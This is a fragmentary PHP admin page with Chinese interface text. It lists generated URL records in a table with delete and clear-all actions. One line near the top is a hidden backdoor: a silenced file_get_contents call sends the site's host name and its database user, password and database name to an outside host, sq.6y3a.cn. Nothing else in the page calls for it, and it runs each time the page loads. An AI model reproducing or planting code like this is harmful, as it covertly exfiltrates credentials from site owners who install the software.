...
@file_get_contents("http://sq.6y3a.cn/up.php?url=".$_SERVER['HTTP_HOST']."&user=".$dbconfig['user']."&pwd=".$dbconfig['pwd']."&db=".$dbconfig['dbname']);
...
if(isset($_GET['kw'])) {
	...
	$sql=" 1";
	$con='系统共有 <b>'.$numrows.'</b> 条生成记录 [<a href="./ggao.php?my=qk">清空所有</a>]';
}
echo $con;
?>
	  ...
	  <form name="form1" method="post" action="ggao.php?my=del2">
        <table class="table table-striped">
          <thead><tr><th>网址</th><th>时间</th><th>操作</th></tr></thead>
          <tbody>
<?php
$pagesize=30;
...
{
echo '<tr><td><input type="checkbox" name="checkbox[]" value="'.$res['id'].'"> <a href="'.htmlspecialchars($res['url']).'" rel="noreferrer" target="_blank">'.htmlspecialchars($res['url']).'</a></td><td>'.$res['date'].'</td><td><a href="./ggao.php?my=del&id='.$res['id'].'" class="btn btn-xs btn-danger" onclick="return confirm(\'你确实要删除此记录吗？\');">删除</a></td></tr>';
}
?>
          </tbody>
        </table>
